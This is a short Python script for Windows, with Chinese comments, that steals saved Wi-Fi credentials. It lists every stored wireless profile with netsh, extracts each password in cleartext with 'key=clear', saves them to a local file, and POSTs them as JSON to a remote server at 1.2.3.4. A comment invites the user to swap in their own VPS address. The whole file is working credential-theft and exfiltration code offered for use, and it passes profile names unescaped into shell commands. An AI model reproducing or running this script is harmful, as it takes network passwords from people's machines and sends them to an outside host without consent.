import subprocess
import re
import requests

# Script created by iknow

def get_wifi_profiles():
    try:
        # 执行命令获取所有无线网络名称
        result = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
        # 提取所有无线网络名称
        profiles = re.findall(r"所有用户配置文件\s*:\s*(.*)", result)
        return profiles
    except subprocess.CalledProcessError as e:
        print(f"获取WiFi配置文件时出错: {e}")
        return []

def get_wifi_password(profile_name):
    try:
        # 执行命令获取指定无线网络的密码
        result = subprocess.check_output(f'netsh wlan show profile name="{profile_name}" key=clear', shell=True, text=True)
        # 提取密码
        match = re.search(r"关键内容\s*:\s*(.*)", result)
        if match:
            return match.group(1)
        else:
            return "未找到密码"
    except subprocess.CalledProcessError as e:
        print(f"获取WiFi密码时出错（{profile_name}）: {e}")
        return "获取密码出错"

def save_passwords_to_file(profiles, filename):
    data = []
    with open(filename, 'w') as file:
        for profile in profiles:
            password = get_wifi_password(profile)
            file.write(f"Wife名称: {profile}\nWife密码: {password}\n\n")
            data.append({'profile': profile, 'password': password})
    return data

def send_data_to_vps(data):
    try:
        url = "http://1.2.3.4/receive_wifi_data"  # 替换为你的VPS接收数据的URL
        response = requests.post(url, json=data)
        if response.status_code == 200:
            print("数据成功发送到VPS")
        else:
            print(f"发送数据时出错: {response.status_code}")
    except Exception as e:
        print(f"发送数据到VPS时出错: {e}")

if __name__ == "__main__":
    profiles = get_wifi_profiles()
    if profiles:
        data = save_passwords_to_file(profiles, "1.txt")
        send_data_to_vps(data)
        print("密码已保存到1.txt并发送到VPS")
        print("End of script by iknow")
    else:
        print("未找到WiFi配置文件。")

